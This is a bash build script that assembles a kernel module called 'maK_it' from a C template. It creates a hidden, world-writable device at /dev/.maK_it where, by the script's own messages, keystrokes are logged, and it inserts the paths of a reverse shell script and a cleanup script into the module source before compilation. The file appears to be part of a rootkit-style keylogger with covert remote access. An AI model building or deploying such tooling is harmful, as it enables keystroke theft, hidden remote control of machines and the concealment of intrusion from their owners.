#!/bin/bash
#This script builds our module from the template.

KERN=$(uname -r)
IN="template.c"
OUT="maK_it.c"

BREAK="----------------------------"

echo $BREAK
#Templates to be replaced
DEV="DEVICE_NAME_TEMPLATE"
MAJOR="DEVICE_MAJOR_TEMPLATE"
ARG1=".maK_it"
ARG2="33"

DEV_NAME="DEVICE_NAME \"$ARG1\""
MAJ_NAME="DEVICE_MAJOR $ARG2"

echo "Building '$OUT' file using /dev/$ARG1 for Device Name and $ARG2 as a Major Number..."
rm -f /dev/$ARG1 #Making sure it's cleared
echo "Creating virtual device /dev/$ARG1"
mknod /dev/$ARG1 c $ARG2 0
chmod 777 /dev/$ARG1
echo "Keys will be logged to virtual device."

echo $BREAK
#Templates to be replaced
WHERE=$(pwd)"/shells/revshell"
WHERE2=$(pwd)"/scripts/kill_shell.sh"
ESC_SHELL=$(echo $WHERE | sed -e 's/\//\\\//g')
ESC_CLEAN=$(echo $WHERE2 | sed -e 's/\//\\\//g')
SHELL_TMP="SHELL_TEMPLATE"
CLEAN_TMP="CLEAN_TEMPLATE"

echo "Adding reverse shell script path to template..."
echo "$WHERE ..."
echo "Adding cleanup script to template..."
echo "$WHERE2 ..."
echo $BREAK
sed -e "s/$DEV/$DEV_NAME/g;s/$MAJOR/$MAJ_NAME/g;s/$SHELL_TMP/$ESC_SHELL/g;s/$CLEAN_TMP/$ESC_CLEAN/g;" < $IN > $OUT


echo "Completed. Run make command"

